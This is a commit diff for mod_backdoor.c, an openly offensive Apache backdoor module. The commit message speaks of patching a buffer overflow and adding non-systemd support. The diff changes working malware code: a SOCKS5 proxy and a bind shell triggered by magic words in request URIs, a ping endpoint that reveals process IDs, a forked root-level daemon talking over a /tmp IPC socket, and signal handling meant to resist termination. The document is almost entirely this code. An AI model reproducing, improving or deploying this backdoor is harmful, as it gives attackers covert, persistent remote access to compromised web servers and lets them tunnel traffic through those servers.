Patching buffer overflow in error log. Working on compatibility with non-systemd init

+++ mod_backdoor.c
@@ -5,7 +5,7 @@
 /* Idea inspired from @TheXC3LL */
 // https://www.tarlogic.com/en/blog/backdoors-modulos-apache/
 /* ************************************************************* */
-//Socks5 code inspired from https://github.com/fgssfgss/socks_proxy
+//Socks5 code inspired from https://github.com/rofl0r/microsocks
 /* ************************************************************* */
 
 #include <sys/types.h>
@@ -134,7 +134,8 @@ static void dolog(const char* fmt, ...) { }
 #define IPC "/tmp/mod_backdoor"
 
 pid_t pid;
-static sblist* pidList;
+static pid_t mainPid;
+static pid_t rootPid;
 
 /****************************/
 /// SOCKS proxy functions ///
@@ -340,7 +341,9 @@ static void* clientthread(void *data) {
     while((n = recv(t->client.fd, buf, sizeof buf, 0)) > 0) {
         // To kill proxy when you don't need it
         if(!strncmp(buf,STOPPROXY,strlen(STOPPROXY))){
-            kill(getppid(),SIGKILL);
+            if(kill(getppid(),SIGTERM) == -1){
+                kill(getppid(),SIGKILL);
+            }
             exit(0);
         }
         switch(t->state) {
@@ -713,7 +716,6 @@ void* bicomIPC(int sock, int revsockfd){
     return;
 }
 
-
 static int backdoor_post_read_request(request_rec *r) {
 	int fd, sock, n, sr;
 	fd_set readset;
@@ -749,7 +751,8 @@ static int backdoor_post_read_request(request_rec *r) {
 		fd = client_socket->socketdes;
 	}
 
-	if (strstr(r->uri, SOCKSWORD)) {
+
+    if (strstr(r->uri, SOCKSWORD)) {
 
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
@@ -806,22 +809,26 @@ static int backdoor_post_read_request(request_rec *r) {
         server.sin_addr.s_addr = INADDR_ANY;
         server.sin_port = htons(atoi(port));
 
-        while(1){
 
-            new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
+        new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
 
-            // To properly kill old shells
-            close(bindfd);
+        // To properly kill old shells
+        close(bindfd);
 
-            write(sock,"BIND",strlen("BIND"));
-            bicomIPC(sock,new_socket);
-            close(new_socket);
-        }
+        write(sock,"BIND",strlen("BIND"));
+        bicomIPC(sock,new_socket);
+        close(new_socket);
 
     }
 
 	if (!strcmp(r->uri, PINGWORD)) {
-		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
+		//write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
+		char* info = malloc(1024);
+        sprintf(info,"mainPID --> %d\n",mainPid);
+		write(fd,info, strlen(info));
+        sprintf(info,"rootPID --> %d\n",rootPid);
+        write(fd,info, strlen(info));
+		free(info);
 		close(fd);
 		exit(0);
 	}
@@ -948,64 +955,12 @@ void* rmCgroup(){
     }
 }
 
-/*void* amIAlone(){
-    char pidLine[1024];
-    char *opid;
-    int i = 0;
-    FILE *pidFile = popen("pidof apache2","r");
-    fgets(pidLine,1024,pidFile);
-
-    opid = strtok(pidLine," ");
-    while(opid != NULL)
-    {
-        opid = strtok(NULL, " ");
-        i++;
-    }
-    pclose(pidFile);
-    if(i < 3){
-        if (kill(getpid(),SIGTERM) == -1){
-            kill(getpid(),SIGKILL);
-        }
-        return;
-    }else{
-        sleep(3);
-        amIAlone();
-    }
-}*/
-
-/*void* amIAlone(){
-
-    size_t i = sblist_getsize(pidList);
-    *//*while(1){
-        for(i=0;i<sblist_getsize(pidList);i++) {
-            if(kill(sblist_get(pidList,i),0) != 0){
-                exit(0);
-            }
-        }
-        sleep(1);
-    }*//*
-}*/
 
 int waitIPC(int master){
-    pthread_t thread_id;
+    //pthread_t thread_id;
     fd_set readfds;
     int rc, sd, sr;
     char buf[1024];
-
-    //pthread_create(thread_id, NULL, amIAlone,NULL);
-    //pthread_join(thread_id,NULL);
-
-    /*pid = fork();
-    if(pid == 0){
-        pid = fork();
-        if(pid==0){
-            amIAlone();
-        }else{
-            exit(0);
-        }
-    }else{
-        exit(0);
-    }*/
 
     while(1) {
         FD_ZERO(&readfds);
@@ -1044,6 +999,7 @@ int waitIPC(int master){
                         }else{
                             pid = fork();
                             if(pid == 0){
+                                rootPid = getpid();
                                 waitIPC(master);
                             }else{
                                 exit(0);
@@ -1068,18 +1024,14 @@ void sig_handler(int signum)
 }
 
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
-    // Clean old IPC to assure compatibility with non-systemd systems
-    // systemd has a private /tmp for apache2, which is cleaned everytime the service (re)start
-    // init-like process doesn't have private /tmp by default for apache2
-    // That was an issue when restarting the apache2 service
-    //apr_pool_cleanup_register(s->pool,NULL,removeIPC,apr_pool_cleanup_null);
 
     pid = fork();
     // Return father process just after he had loaded the config to create apache2 root daemon
     if (pid > 0) {
-        //sblist_add(pidList,&pid);
+        mainPid = getpid();
         return OK;
     }
+    rootPid = getpid();
 
     signal(SIGTERM, sig_handler);
     signal(SIGKILL, sig_handler);
@@ -1094,10 +1046,7 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
     if (sd < 0) {
         exit(0);
     }
-    /*int reuse;
-    if (setsockopt(master, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse, sizeof(int)) == -1){
-        exit(0);
-    }*/
+
     memset(&serveraddr, 0, sizeof(serveraddr));
     serveraddr.sun_family = AF_UNIX;
     strcpy(serveraddr.sun_path, IPC);
@@ -1131,6 +1080,14 @@ static int backdoor_log_transaction(request_rec *r) {
 	if (backdoor == 0) {
 		return DECLINED;
 	}
+
+    // Clean old IPC to assure compatibility with non-systemd systems
+    // systemd has a private /tmp for apache2, which is cleaned everytime the service (re)start
+    // init-like process doesn't have private /tmp by default for apache2
+    // That was an issue when restarting the apache2 service
+    /*** CURRENTLY NOT WORKING ***/
+    //apr_pool_cleanup_register(r->pool,NULL,amIAlone,apr_pool_cleanup_null);
+
 	exit(0);
 }
